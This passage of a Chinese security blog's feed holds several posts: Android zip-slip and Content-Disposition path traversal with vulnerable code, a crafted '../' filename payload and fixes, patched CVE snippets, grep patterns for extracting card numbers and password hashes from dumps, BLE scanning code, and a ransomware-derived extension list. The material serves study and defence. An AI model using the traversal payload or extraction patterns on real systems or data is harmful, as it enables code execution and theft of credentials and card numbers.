Frameworks会自动链接例如：IPAPatch/Assets/Frameworks/RevealServer.framework下图是通过 Reveal，拿到需要集成的 Framework 文件将 RevealServer.framework 放置在 Assets/Frameworks/RevealServer.framework 配置Build Settings使用xcode打开IPAPatch.xcodeproj,在Project Editor中选择IPAPatch-DummyApp，默认名称为”💊”, 可以自由修改。修改Bundle Identifier，并配置codesing 编译运行编译后点击手机上的图标运行app,会提示证书问题，去设置-通用-设备管理中信任证书即可。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Android中的目录穿越漏洞]]></title>
    <url>%2F2018%2F03%2F30%2Fzip%E8%A7%A3%E5%8E%8B%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[概述在Linux/Unix系统中“..”代表的是向上级目录跳转，如果程序在处理到诸如用“../../../../../../../../../../../etc/hosts”表示的文件时没有进行防护，则会跳转出当前工作目录，跳转到到其他目录中,即目录穿越。 在 Android 中由于目录穿越造成任意文件写入的漏洞较为常见。首先是写文件的接口可能本身设计上就允许传入任意路径的参数，另一种情况就是直接拼接路径导致可以 “…/” 进行目录穿越。 由于存在目录穿越漏洞的代码执行者通常是应用本身（非webview沙箱进程），因此一旦存在任意文件写入漏洞，就有可能覆盖原有的文件。此时若应用中存在动态加载代码的逻辑，配合目录穿越则有可能实现任意代码执行。 add:后来又多个团队或研究人员研究目录穿越问题，并起来各式各样的名字，现留下链接以备参考： zip-slip总结了多个存在目录穿越的第三方语言或库，并包含了具体的代码实例 https://github.com/snyk/zip-slip-vulnerabilityhttps://snyk.io/research/zip-slip-vulnerability zipperdown iOS平台下多个APP存在目录穿越漏洞 目录穿越场景1. 下载文件到指定的路径该场景适用于下载路径由用户可控，例如一些下载工具、保存的目录为用户名等特殊情况。 2. 解压 zip 文件时未对 ZipEntry 文件名检查Android应用中通常会直接下载一些皮肤等资源文件，为了节约流量，一些资源文件通常打包成zip。 Java代码在解压ZIP文件时会使用到ZipEntry类的getName()方法。如果ZIP文件中包含“../”的字符串，该方法返回值里面会原样返回。如果在这里没有进行防护，继续解压缩操作，就会将解压文件创建到其他目录中。 漏洞代码如下：1234567891011121314151617181920212223242526272829303132public void UnZipFolder(String zipFileString, String outPathString) throws Exception &#123; //ZipInputStream inZip = new ZipInputStream(new FileInputStream(zipFileString)); ZipInputStream inZip = new ZipInputStream(getAssets().open(&quot;a.zip&quot;)); ZipEntry zipEntry; String szName = &quot;&quot;; while ((zipEntry = inZip.getNextEntry()) != null) &#123; //调用zipEntry的getName方法没有检查是否包含&quot;../&quot; szName = zipEntry.getName(); if (zipEntry.isDirectory()) &#123; // get the folder name of the widget szName = szName.substring(0, szName.length() - 1); File folder = new File(outPathString + File.separator + szName); folder.mkdirs(); &#125; else &#123; File file = new File(outPathString + File.separator + szName); file.createNewFile(); // get the output stream of the file FileOutputStream out = new FileOutputStream(file); int len; byte[] buffer = new byte[1024]; // read (len) bytes into buffer while ((len = inZip.read(buffer)) != -1) &#123; // write (len) byte from buffer at the position 0 out.write(buffer, 0, len); out.flush(); &#125; out.close(); &#125; &#125; inZip.close(); &#125; 此时，构造一个zip文件，其中某一个文件的名字为“../../../../../../sdcard/exec.so”,调用上述代码时就会触发漏洞。 在主流操作系统中，文件名是不允许包含“/”的，那么也就无法通过直接压缩的方式构造zip包了。那么如何构造一个包含“../”的zip文件？ 可以先计算含“../”的文件名长度，例如“../../../../../../sdcard/exec.so”长度为32,我们先创建一个文件“aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.so”,之后压缩成为zip，然后再用010editor找到对应字段直接修改即可。 3. 下载时未对 Content-Disposition进行合法性检查Content-Disposition 是常见的 HTTP 协议 header，在文件下载时可以告诉客户端浏览器下载的文件名。例如服务器返回 Content-Disposition: attachment; filename=”my.html” ，浏览器将弹出另存为对话框（或直接保存），默认的文件名就是 my.html。 但这个 filename 参数显然是不可信任的。例如恶意网站返回的文件名包含 ../，当 Android 应用尝试将这个文件保存到 /sdcard/Downloads 时，攻击者就有机会把文件写入到 /data/ 目录中了： 例如如下的代码逻辑： 服务端：1234&lt;?phpheader(&apos;Content-Disposition: attachment;filename=../../../../../../../../sdcard/hack.php&apos;);echo &quot;hello,m4bln&quot;;?&gt; 客户端123456789101112131415161718192021222324252627282930313233public void downloadFiles(String urlStr)&#123; FileOutputStream output; try &#123; URL url=new URL(urlStr); //创建一个HTTP链接 HttpURLConnection urlConn=(HttpURLConnection)url.openConnection(); urlConn.connect(); //根据header中的Content-Disposition 获取文件名 String fileName = urlConn.getHeaderField(&quot;Content-Disposition&quot;); fileName = URLDecoder.decode(fileName.substring(fileName.indexOf(&quot;filename&quot;)+10,fileName.length()-1),&quot;UTF-8&quot;); InputStream inputStream=urlConn.getInputStream(); File file=new File(getApplicationContext().getFilesDir().toString()+&quot;/&quot;+fileName); output=new FileOutputStream(file); byte buffer[]=new byte[4*1024];//每次存4K int temp; //写入数据 while((temp=inputStream.read(buffer))!=-1)&#123; output.write(buffer,0,temp); &#125; output.flush(); &#125; catch (Exception e) &#123; System.out.println(&quot;读写数据异常:&quot;+e); &#125; &#125; 注： 当使用默认浏览器下载时，浏览器会把“../”替换为”.._” 几种常见的 Android 下动态加载可执行代码如果应用动态加载代码之前未做签名校验，利用目录穿越漏洞进行覆盖，可实现稳定的任意代码执行。此外由于在文件系统中写入了可执行文件，还可以实现持久化攻击的效果。 DexClassLoader 动态载入应用可写入的 dex 可执行文件 java.lang.Runtime.exec 方法执行应用可写入的 elf 文件 System.load 和 System.loadLibrary 动态载入应用可写入的 elf 共享对象 本地代码使用 system、popen 等类似函数执行应用可写入的 elf 文件 本地代码使用 dlopen 载入应用可写入的 elf 共享对象 利用 Multidex 机制：A Pattern for Remote Code Execution using Arbitrary File Writes and MultiDex Applications 关于动态加载需要注意以下几点： 1. 在Android中，System.loadLibrary()是从应用的lib目录中加载.so文件，而System.load()是用某个.so文件的绝对路径加载，这个.so文件可以不在应用的lib目录中，可以在SD卡中，或者在应用的files目录中，只要应用有读的权限目录中即可。2. 在files目录中，应用具有写入权限，利用ZIP文件目录遍历漏洞可以替换掉原先的so文件，达到远程命令执行的目的。而应用的lib目录是软链接到了/data/app-lib/应用目录，属于system用户，第三方应用在执行时没有写入/data/app-lib目录的权限 常见的修复方法 对重要的ZIP压缩包文件进行数字签名校验，校验通过才进行解压。 检查Zip压缩包中使用ZipEntry.getName()获取的文件名中是否包含”../”或者”..” 检查”../”的时候不必进行URI Decode（以防通过URI编码”..%2F”来进行绕过），测试发现ZipEntry.getName()对于Zip包中有“..%2F”的文件路径不会进行处理。 参考链接 https://jaq.alibaba.com/community/art/show?articleid=383 https://zhuanlan.zhihu.com/p/28107901]]></content>
  </entry>
  <entry>
    <title><![CDATA[经典漏洞案例整理]]></title>
    <url>%2F2018%2F03%2F23%2F%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[字符串’\0’在处理字符串时，没有在尾部加‘\0’，导致使用时会读取字符串后边的数据123456789+void BnAudioPolicyService::sanetizeAudioAttributes(audio_attributes_t* attr)+&#123;+ const size_t tagsMaxSize = AUDIO_ATTRIBUTES_TAGS_MAX_SIZE;+ if (strnlen(attr-&gt;tags, tagsMaxSize) &gt;= tagsMaxSize) &#123;+ android_errorWriteLog(0x534e4554, &quot;68953950&quot;); // SafetyNet logging+ &#125;+ attr-&gt;tags[tagsMaxSize - 1] = &apos;\0&apos;;+&#125;+ strcat123456789101112没有控制好循环次数，导致strcat溢出for (i=0; i &lt; (prop-&gt;len)/sizeof(bt_uuid_t); i++) &#123; bt_uuid_t *p_uuid = (bt_uuid_t*)prop-&gt;val + i; memset(buf, 0, sizeof(buf)); uuid_to_string_legacy(p_uuid, buf); //buf_length=36 &quot;%.8x-%.4x-%.4x-%.4x-%.8x%.4x&quot; strcat(value, buf); //value_length=1024 // when (prop-&gt;len)/sizeof(bt_uuid_t) &gt; 1024/36 ,value whill overflow. //prop-&gt;len &gt; 455 //strcat(value, &quot;;&quot;); strcat(value, &quot; &quot;); &#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[常用的正则、搜索]]></title>
    <url>%2F2018%2F03%2F22%2F%E5%B8%B8%E7%94%A8%E7%9A%84%E6%AD%A3%E5%88%99%E3%80%81%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[转自：https://www.unix-ninja.com/p/A_cheat-sheet_for_password_crackers 提取E-mail1grep -E -o &quot;\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b&quot; *.txt &gt; e-mails.txt 提取http url1grep http | grep -shoP &apos;http.*?[&quot; &gt;]&apos; *.txt &gt; http-urls.txt For extracting HTTPS, FTP and other URL format use1grep -E &apos;(((https|ftp|gopher)|mailto)[.:][^ &gt;&quot; ]*|www.[-a-z0-9.]+)[^ .,; &gt;&quot;&gt;):]&apos; *.txt &gt; urls.txt 提取浮点数1grep -E -o &quot;^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$&quot; *.txt &gt; floats.txt 提取信用卡号码1234567891011121314151617181920Visa # grep -E -o &quot;4[0-9]&#123;3&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; visa.txtMasterCard # grep -E -o &quot;5[0-9]&#123;3&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; mastercard.txtAmerican Express # grep -E -o &quot;\b3[47][0-9]&#123;13&#125;\b&quot; *.txt &gt; american-express.txtDiners Club # grep -E -o &quot;\b3(?:0[0-5]|[68][0-9])[0-9]&#123;11&#125;\b&quot; *.txt &gt; diners.txtDiscover # grep -E -o &quot;6011[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;[ -]?[0-9]&#123;4&#125;&quot; *.txt &gt; discover.txtJCB # grep -E -o &quot;\b(?:2131|1800|35d&#123;3&#125;)d&#123;11&#125;\b&quot; *.txt &gt; jcb.txtAMEX # grep -E -o &quot;3[47][0-9]&#123;2&#125;[ -]?[0-9]&#123;6&#125;[ -]?[0-9]&#123;5&#125;&quot; *.txt &gt; amex.txt 各种hash的提取md5 hash1egrep -oE &apos;(^|[^a-fA-F0-9])[a-fA-F0-9]&#123;32&#125;([^a-fA-F0-9]|$)&apos; *.txt | egrep -o &apos;[a-fA-F0-9]&#123;32&#125;&apos; &gt; md5-hashes.txt 或1sed -rn &apos;s/.*[^a-fA-F0-9]([a-fA-F0-9]&#123;32&#125;)[^a-fA-F0-9].*/1/p&apos; *.txt &gt; md5-hashes 上述代码用来查找SHA1, SHA256等其他未加salt的hash, 对于其他长度hash,只需要更改{32}中的长度 Extract valid MySQL-Old hashes1grep -e &quot;[0-7][0-9a-f]&#123;7&#125;[0-7][0-9a-f]&#123;7&#125;&quot; *.txt &gt; mysql-old-hashes.txt Extract blowfish hashes1grep -e &quot;$2a\$8\$(.)&#123;75&#125;&quot; *.txt &gt; blowfish-hashes.txt Extract Joomla hashes1egrep -o &quot;([0-9a-zA-Z]&#123;32&#125;):(w&#123;16,32&#125;)&quot; *.txt &gt; joomla.txt Extract VBulletin hashes1egrep -o &quot;([0-9a-zA-Z]&#123;32&#125;):(S&#123;3,32&#125;)&quot; *.txt &gt; vbulletin.txt Extraxt phpBB3-MD51egrep -o &apos;$H$S&#123;31&#125;&apos; *.txt &gt; phpBB3-md5.txt Extract Wordpress-MD51egrep -o &apos;$P$S&#123;31&#125;&apos; *.txt &gt; wordpress-md5.txt Extract Drupal 71egrep -o &apos;$S$S&#123;52&#125;&apos; *.txt &gt; drupal-7.txt Extract old Unix-md51egrep -o &apos;$1$w&#123;8&#125;S&#123;22&#125;&apos; *.txt &gt; md5-unix-old.txt Extract md5-apr11egrep -o &apos;$apr1$w&#123;8&#125;S&#123;22&#125;&apos; *.txt &gt; md5-apr1.txt Extract sha512crypt, SHA512(Unix)1egrep -o &apos;$6$w&#123;8&#125;S&#123;86&#125;&apos; *.txt &gt; sha512crypt.txt]]></content>
  </entry>
  <entry>
    <title><![CDATA[蓝牙、BLE设备相关]]></title>
    <url>%2F2018%2F03%2F17%2F%E8%93%9D%E7%89%99%E7%9A%84%E5%8F%91%E7%8E%B0%E3%80%81%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[标准蓝牙设备扫描经典蓝牙设备1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889final BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE); mBluetoothAdapter = bm.getAdapter(); if (mBluetoothAdapter == null || !mBluetoothAdapter.isEnabled()) &#123; Toast.makeText(this,&quot;please open bluttooth&quot;,Toast.LENGTH_LONG).show(); Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE); startActivityForResult(enableBtIntent, 0); &#125; //获取已经绑定的蓝牙 Set&lt;BluetoothDevice&gt; devices = mBluetoothAdapter.getBondedDevices(); //遍历已绑定设备 if (devices.size() &gt; 0) &#123; for (BluetoothDevice bluetoothDevice : devices) &#123; String info = bluetoothDevice.getName() + &quot;:&quot; + bluetoothDevice.getAddress() + &quot;\n\n&quot;; Log.d(&quot;m4bln&quot;,info); &#125; &#125; /* //扫描标准蓝牙设备 IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_FOUND); filter.addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED); filter.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED); registerReceiver(mReceiver, filter); if (mBluetoothAdapter.startDiscovery())&#123; Log.d(&quot;jiyuanyuan&quot;,&quot;开始扫描&quot;); &#125; //标准蓝牙设备的receiver private final BroadcastReceiver mReceiver = new BroadcastReceiver() &#123; public void onReceive(Context context, Intent intent) &#123; String action = intent.getAction(); // When discovery finds a device switch (intent.getAction()) &#123; case BluetoothAdapter.ACTION_DISCOVERY_STARTED: Toast.makeText(getApplicationContext(), &quot;正在搜索蓝牙设备，搜索时间大约一分钟&quot;, Toast.LENGTH_SHORT).show(); break; case BluetoothAdapter.ACTION_DISCOVERY_FINISHED: Toast.makeText(getApplicationContext(), &quot;搜索蓝牙设备结束&quot;, Toast.LENGTH_SHORT).show(); break; case BluetoothDevice.ACTION_FOUND: BluetoothDevice bluetoothDevice = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE); Log.d(&quot;jiyuanyuan&quot;,bluetoothDevice.getAddress()+bluetoothDevice.getName()); if (bluetoothDevice.getAddress().equals(&quot;1C:52:16:4E:7C:86&quot;))&#123; //78:62:56:D4:A2:3E Log.d(&quot;jiyuanyuan&quot;,&quot;链接 QCY&quot;); //bluetoothDevice.createBond(); try &#123; Boolean returnValue = false; Method createBondMethod = BluetoothDevice.class.getMethod(&quot;createBond&quot;); Log.d(&quot;BlueToothTestActivity&quot;, &quot;开始配对&quot;); returnValue = (Boolean) createBondMethod.invoke(bluetoothDevice); Log.d(&quot;BlueToothTestActivity&quot;, &quot;配对返回：&quot;+returnValue.toString()); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;else &#123; Log.d(&quot;jiyuanyuan&quot;,&quot;不相信&quot;); &#125; break; case BluetoothDevice.ACTION_BOND_STATE_CHANGED: int status = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE); if (status == BluetoothDevice.BOND_BONDED) &#123; Toast.makeText(getApplicationContext(), &quot;已连接&quot;, Toast.LENGTH_SHORT).show(); &#125; else if (status == BluetoothDevice.BOND_NONE) &#123; Toast.makeText(getApplicationContext(), &quot;未连接&quot;, Toast.LENGTH_SHORT).show(); &#125; else if(status == BluetoothDevice.BOND_BONDING)&#123; Toast.makeText(getApplicationContext(), &quot;配对中&quot;, Toast.LENGTH_SHORT).show(); &#125; break; &#125; &#125; &#125;; 参考https://developer.android.google.cn/guide/topics/connectivity/bluetooth.html BLE设备BLE（Bluetooh Low Energy）蓝牙低能耗技术是短距离、低成本、可互操作性的无线技术，它利用许多智能手段最大限度地降低功耗。BLE设备有效传输距离被提升到了100米以上，同时只需要一颗纽扣电池就可以工作数年之久。 Android 4.3 (API level 18)内置了对BLE设备的支持，允许APP实现发现BLE设备、查找服务以及信息传输。 GAPGAP（Generic Access Profile），它用来控制设备连接和广播。GAP 使你的设备被其他设备可见，并决定了你的设备是否可以或者怎样与合同设备进行交互。例如 Beacon 设备就只是向外广播，不支持连接，小米手环就等设备就可以与中心设备连接。 设备角色GAP 给设备定义了若干角色，其中主要的两个是：外围设备（Peripheral）和中心设备（Central）。外围设备：一般就是非常小或者简单的低功耗设备，用来提供数据，并连接到一个更加相对强大的中心设备。例如小米手环。中心设备：中心设备相对比较强大，用来连接其他外围设备。例如手机等。 广播数据在 GAP 中外围设备通过两种方式向外广播数据： Advertising Data Payload（广播数据）和 Scan Response Data Payload（扫描回复），每种数据最长可以包含 31 byte。这里广播数据是必需的，因为外设必需不停的向外广播，让中心设备知道它的存在。扫描回复是可选的，中心设备可以向外设请求扫描回复，这里包含一些设备额外的信息，例如设备的名字。 广播流程 外围设备会设定一个广播间隔，每个广播间隔中，它会重新发送自己的广播数据。广播间隔越长，越省电，同时也不太容易扫描到。 几个概念GATT通过BLE连接，读写属性类数据的Profile通用规范，现在所有的BLE应用Profile都是基于GATT的。它定义两个 BLE 设备通过叫做 Service 和 Characteristic 的东西进行通信 GATT 连接需要特别注意的是：GATT 连接是独占的。也就是一个 BLE 外设同时只能被一个中心设备连接。一旦外设被连接，它就会马上停止广播，这样它就对其他设备不可见了。当设备断开，它又开始广播。 GATT 事务是建立在嵌套的Profiles, Services 和 Characteristics之上的的，如下图所示：http://jlog.qiniudn.com/microcontrollers_GattStructure.png ProfileProfile 并不是实际存在于 BLE 外设上的，它只是一个被 Bluetooth SIG 或者外设设计者预先定义的 Service 的集合。例如心率Profile（Heart Rate Profile）就是结合了 Heart Rate Service 和 Device Information Service。 ServiceService 是把数据分成一个个的独立逻辑项，它包含一个或者多个 Characteristic。每个 Service 有一个 UUID 唯一标识。 UUID 有 16 bit 的，或者 128 bit 的。16 bit 的 UUID 是官方通过认证的，需要花钱购买，128 bit 是自定义的，这个就可以自己随便设置。(官方的Service https://www.bluetooth.com/specifications/gatt/services)官方通过了一些标准 Service。以 Heart Rate Service为例，可以看到它的官方通过 16 bit UUID 是 0x180D，包含 3 个 Characteristic：Heart Rate Measurement, Body Sensor Location 和 Heart Rate Control Point，并且定义了只有第一个是必须的，它是可选实现的。 Characteristic Characteristic在 GATT 事务中的最低界别的是 Characteristic，Characteristic 是最小的逻辑数据单元，当然它可能包含一个组关联的数据，例如加速度计的 X/Y/Z 三轴值。 与 Service 类似，每个 Characteristic 用 16 bit 或者 128 bit 的 UUID 唯一标识。你可以免费使用 Bluetooth SIG 官方定义的标准 Characteristic (https://www.bluetooth.com/specifications/gatt/characteristics)，使用官方定义的，可以确保 BLE 的软件和硬件能相互理解。当然，你可以自定义 Characteristic，这样的话，就只有你自己的软件和外设能够相互理解。 举个例子， Heart Rate Measurement Characteristic，这是上面提到的 Heart Rate Service 必需实现的 Characteristic，它的 UUID 是 0x2A37。它的数据结构是，开始 8 bit 定义心率数据格式（是UINT8 还是 UINT16？），接下来就是对应格式的实际心率数据。 实际上，和 BLE 外设打交道，主要是通过 Characteristic。你可以从 Characteristic 读取数据，也可以往 Characteristic 写数据。这样就实现了双向的通信。所以你可以自己实现一个类似串口（UART）的 Sevice，这个 Service 中包含两个 Characteristic，一个被配置只读的通道（RX），另一个配置为只写的通道（TX）。 Android BLE API BluetoothAdapter代表了移动设备的本地的蓝牙适配器, 通过该蓝牙适配器可以对蓝牙进行基本操作，一个Android系统只有一个BluetoothAdapter，通过BluetoothManager获取。 1BluetoothAdapter bluetoothAdapter = bluetoothManager.getAdapter(); BluetoothDevice扫描后发现可连接的设备，获取已经连接的设备。 1BluetoothDevice bluetoothDevice = bluetoothAdapter.getRemoteDevice(address); BluetoothGattCallback对已经连接上设备的某些操作后返回的结果的回调 1234BluetoothGattCallback bluetoothGattCallback = new BluetoothGattCallback()&#123; //实现回调方法，根据业务做相应处理&#125;;BluetoothGatt bluetoothGatt = bluetoothDevice.connectGatt(this, false, bluetoothGattCallback); BluetoothGatt通过BluetoothGatt可以连接设备（connect）,发现服务（discoverServices），并把相应地属性返回到BluetoothGattCallback，可以看成蓝牙设备从连接到断开的生命周期。 扫描BLE设备进行BLE设备扫描时，除了蓝牙权限外，还需要申请定位权限并打开GPS（这个非常坑）。扫描周边的BLE设备代码如下：123456789101112131415161718192021222324252627282930313233343536373839//获取BluetoothAdapterfinal BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);mBluetoothAdapter = bm.getAdapter();//判断蓝牙是否开启 if (mBluetoothAdapter == null || !mBluetoothAdapter.isEnabled()) &#123; Toast.makeText(this,&quot;please open bluttooth&quot;,Toast.LENGTH_LONG).show(); Intent enableBtIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE); startActivityForResult(enableBtIntent, 0); &#125; //扫描BLE设备 mScanCallback = new LeScanCallback();BluetoothLeScanner mBluetoothLeScanner = mBluetoothAdapter.getBluetoothLeScanner();System.out.println(&quot;开始扫描BLE设备。。。&quot;);mBluetoothLeScanner.startScan(mScanCallback);private class LeScanCallback extends ScanCallback&#123; @Override public void onScanResult(int callbackType, ScanResult result) &#123; if(result != null)&#123; System.out.println(&quot;扫面到设备：&quot; + result.getDevice().getName() + &quot; &quot; + result.getDevice().getAddress()); //此处，我们尝试连接MI 设备 mTargetDeviceName =&quot;MI Band 2&quot;; if (result.getDevice().getName() != null &amp;&amp; mTargetDeviceName.equals(result.getDevice().getName())) &#123; //扫描到我们想要的设备后，立即停止扫描 result.getDevice().connectGatt(MainActivity.this, false, mGattCallback); mBluetoothLeScanner.stopScan(mScanCallback); &#125; &#125; else&#123; System.out.println(&quot;result为空&quot;); &#125; &#125; &#125;; BLE设备连接两个设备通过BLE通信，首先需要建立GATT连接，这里我们讲的是Android设备作为client端，连接GATT Server。连接GATT Server，需要调用BluetoothDevice的connectGatt()方法，此函数带三个参数：Context、autoConnect(boolean)和 BluetoothGattCallback 对象。调用后返回BluetoothGatt对象，它是GATT profile的封装，通过这个对象，我们就能进行GATT Client端的相关操作。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182BluetoothDevice bluetoothDevice = bluetoothAdapter.getRemoteDevice(address);BluetoothGattCallback bluetoothGattCallback = new BluetoothGattCallback()&#123; @Override public void onConnectionStateChange(BluetoothGatt gatt, int status, int newState) &#123; super.onConnectionStateChange(gatt, status, newState); &#125; @Override public void onServicesDiscovered(BluetoothGatt gatt, int status) &#123; super.onServicesDiscovered(gatt, status); &#125; @Override public void onCharacteristicRead(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) &#123; super.onCharacteristicRead(gatt, characteristic, status); &#125; @Override public void onCharacteristicWrite(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic, int status) &#123; super.onCharacteristicWrite(gatt, characteristic, status); &#125; @Override public void onCharacteristicChanged(BluetoothGatt gatt, BluetoothGattCharacteristic characteristic) &#123; super.onCharacteristicChanged(gatt, characteristic); &#125; @Override public void onDescriptorRead(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) &#123; super.onDescriptorRead(gatt, descriptor, status); &#125; @Override public void onDescriptorWrite(BluetoothGatt gatt, BluetoothGattDescriptor descriptor, int status) &#123; super.onDescriptorWrite(gatt, descriptor, status); &#125; @Override public void onReliableWriteCompleted(BluetoothGatt gatt, int status) &#123; super.onReliableWriteCompleted(gatt, status); &#125; @Override public void onReadRemoteRssi(BluetoothGatt gatt, int rssi, int status) &#123; super.onReadRemoteRssi(gatt, rssi, status); &#125; @Override public void onMtuChanged(BluetoothGatt gatt, int mtu, int status) &#123; super.onMtuChanged(gatt, mtu, status); &#125;&#125;;BluetoothGatt bluetoothGatt = bluetoothDevice.connectGatt(this, false, bluetoothGattCallback);//以下为获得Gatt后的相关操作对应的响应方法//notification to onCharacteristicChanged；bluetoothGatt.setCharacteristicNotification(characteristic, true);//readCharacteristic to onCharacteristicRead；bluetoothGatt.readCharacteristic(characteristic);//writeCharacteristic to onCharacteristicWrite；bluetoothGatt.wirteCharacteristic(mCurrentcharacteristic);//connect and disconnect to onConnectionStateChange；bluetoothGatt.connect();bluetoothGatt.disconnect();//readDescriptor to onDescriptorRead；bluetoothGatt.readDescriptor(descriptor);//writeDescriptor to onDescriptorWrite；bluetoothGatt.writeDescriptor(descriptor);//readRemoteRssi to onReadRemoteRssi；bluetoothGatt.readRemoteRssi();//executeReliableWrite to onReliableWriteCompleted；bluetoothGatt.executeReliableWrite();//discoverServices to onServicesDiscovered;bluetoothGatt.discoverServices(); 数据解析数据包格式如下图 数据包有两种：广播包（Advertising Data）和响应包（Scan Response），其中广播包是每个设备必须广播的，而响应包是可选的。 每个包都是 31 字节，数据包中分为有效数据（significant）和无效数据（non-significant）两部分。 有效数据部分：包含若干个广播数据单元，称为AD Structure。如图中所示，AD Structure的组成是：第一个字节是长度值Len，表示接下来的Len个字节是数据部分。数据部分的第一个字节表示数据的类型AD Type，剩下的Len - 1个字节是真正的数据AD data。其中AD type非常关键，决定了AD Data的数据代表的是什么和怎么解析 无效数据部分：因为广播包的长度必须是31字节，如果有效数据部分不到31字节，剩下的就用0补齐，这部分的数据是无效的，解析的时候，直接忽略即可。 根据如下数据包，举例说明LBE数据包的解析：102 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 09 03 E7 FE 12 FF 0F 18 0A 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 根据解析规则，可分成如下部分： 广播数据(前31字节)02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 响应数据09 03 E7 FE 12 FF 0F 18 0A 18 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 有效数据02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 09 03 E7 FE 12 FF 0F 18 0A 18 无效数据00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 其中的有效数据又可分为如下几个数据单元： 02 01 06 14 FF 11 22 00 00 00 01 00 1F 09 01 00 00 00 CE DD 5E 5A 5D 23 06 08 48 45 54 2D 35 09 03 E7 FE 12 FF 0F 18 0A 18根据上面AD Type定义（所有的 AD type 的定义在文档中）分别解析如下：第一组数据告诉我们该设备属于LE普通发现模式，不支持BR/EDR；第二组数据告诉我们该数据为厂商自定义数据，一般是必须解析的，可根据协议规则进行解析获取对应的所需信息；第三组数据告诉我们该设备的简称为HET-5，其中对应的字符是查找ASSIC表得出的；第四组数据告诉我们UUID为E7FE-12FF-0F18-0A18(此处有疑，类型03表示的是16位的UUID，对应的两个字节，而此处有8个字节，估计是设备烧录时把字节位数理解为了字符位数导致的问题). 参考 https://github.com/Jiesean/BleDemo https://developer.android.google.cn/guide/topics/connectivity/bluetooth-le.html http://www.huwei.tech/2016/07/07/Android-BLE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E4%BA%94%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5 https://www.race604.com/gatt-profile-intro/]]></content>
  </entry>
  <entry>
    <title><![CDATA[文件后缀名枚举]]></title>
    <url>%2F2018%2F03%2F15%2F%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E5%90%8D%E6%9E%9A%E4%B8%BE%2F</url>
    <content type="text"><![CDATA[从一份恶意代码分析报告中抽取得，冥冥之中觉得以后有用，收藏以备用。 .000 .001 .1 .101 .103 .108 .110 .123 .128 .1cd .1sp .1st .3 .3d .3d4 .3dd .3df .3df8 .3dm .3dr .3ds .3dxml .3fr .3g2 .3ga .3gp .3gp2 .3mm .3pr .3w .4w7 .602 .7z .7zip .8 .89t .89y .8ba .8bc .8be .8bf .8bi8 .8bl .8bs .8bx .8by .8li .8svx .8xt .9xt .9xy .a$v .a2c .aa .aa3 .aac .aaf .aah .aaui .ab4 .ab65 .abc .abk .abt .abw .ac2 .ac3 .ac5 .acc .accdb .accde .accdr .accdt .ace .acf .ach .acp .acr .acrobatsecuritysettings .acrodata .acroplugin .acrypt .act .ad .ada .adb .adc .add .ade .adi .adoc .ados .adox .adp .adpb .adr .ads .adt .aea .aec .aep .aepx .aes .aet .afdesign .afm .afp .agd1 .agdl .age3rec .age3sav .age3scn .age3xrec .age3xsav .age3xscn .age3yrec .age3ysav .age3yscn .ahf .ai .aif .aiff .aim .aip .ais .ait .ak .al .al8 .ala .alb3 .alb4 .alb5 .alb6 .ald .ali .allet .alt3 .alt5 .amf .aml .amr .amt .amu .amx .amxx .anl .ann .ans .ansr .anx .aoi .ap .apa .apd .ape .apf .api .apj .apk .apnx .apo .app .approj .apr .apt .apw .apxl .arc .arch00 .arff .ari .arj .aro .arr .ars .arw .as .as$ .as3 .asa .asc .ascm .ascx .asd .ase .asf .ashx .ask .asl .asm .asmx .asn .asnd .asp .aspx .asr .asset .ast .asv .asvx .asx .ath .atl .atomsvc .atw .automaticdestinations-ms .aux .av .avi .avn .avs .awd .awe .awg .awp .aws .awt .aww .awwp .ax .azf .azs .azw .azw1 .azw3 .azw4 .b .b27 .b2a .back .backup .backupdb .bad .bak 